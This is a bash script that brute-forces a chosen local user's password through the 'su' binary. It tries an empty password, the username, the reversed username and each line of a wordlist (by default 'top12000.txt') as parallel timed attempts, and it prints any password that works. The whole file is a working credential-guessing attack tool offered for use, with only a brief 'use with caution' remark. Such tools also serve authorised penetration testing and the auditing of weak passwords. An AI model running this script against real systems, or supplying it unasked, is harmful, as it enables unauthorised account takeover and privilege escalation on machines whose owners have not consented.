#!/bin/bash

# Display help information
display_help() {
  cat << EOF
This tool bruteforces a selected user using binary 'su'. It tries a null password, username,
reverse username, and passwords from a wordlist. The default wordlist is 'top12000.txt'.

Usage:
  $0 -u <username> [-w <wordlist>] [-t <timeout>] [-s <sleep>]

Options:
  -u <username>   Specify the username (CASE SENSITIVE).
  -w <wordlist>   Specify an alternative wordlist (default is 'top12000.txt').
  -t <timeout>    Timeout for 'su' process (default is 0.7 seconds).
  -s <sleep>      Sleep time between 'su' attempts (default is 0.007 seconds).

Example:
  $0 -u USERNAME -w top12000.txt -t 0.7 -s 0.007

Note: This script does not check if the provided username exists. Use with caution.
EOF
}

# Default values
WORDLIST="top12000.txt"
USER=""
TIMEOUT="0.7"
SLEEP="0.007"

# Parse command-line arguments
while getopts "hu:t:s:w:" opt; do
  case "$opt" in
    h) display_help; exit 0;;
    u) USER=$OPTARG;;
    t) TIMEOUT=$OPTARG;;
    s) SLEEP=$OPTARG;;
    w) WORDLIST=$OPTARG;;
    *) display_help; exit 1;;
  esac
done

# Check for username
if [ -z "$USER" ]; then
  display_help
  exit 1
fi

# Check if wordlist exists
if [ "$WORDLIST" != "-" ] && [ ! -f "$WORDLIST" ]; then
  echo "Wordlist ($WORDLIST) not found!"
  exit 1
fi

# Function to try a password
try_password() {
  local user=$1
  local password=$2
  if echo "$password" | timeout "$TIMEOUT" su "$user" -c whoami 2>/dev/null; then
    echo -e "\033[1;31;103mYou can login as $user using password: $password\033[0m"
    exit 0
  fi
}

# Main function to perform brute-force
bruteforce_user() {
  local user=$1
  echo -e "  [+] Bruteforcing $user..."

  # Try the password-less attempt, the username as the password, and the reversed username
  try_password "$user" "" &
  try_password "$user" "$user" &
  try_password "$user" "$(echo "$user" | rev)" &

  # Process the wordlist or stdin
  if [ ! -p /dev/stdin ] && [ -f "$WORDLIST" ]; then
    while IFS= read -r password || [ -n "$password" ]; do
      try_password "$user" "$password" &
      sleep "$SLEEP"
    done < "$WORDLIST"
  else
    while IFS= read -r password; do
      try_password "$user" "$password" &
      sleep "$SLEEP"
    done
  fi
  wait
}

# Start bruteforce process
bruteforce_user "$USER"
echo -e "\033[1;31;107mWordlist exhausted\033[0m"
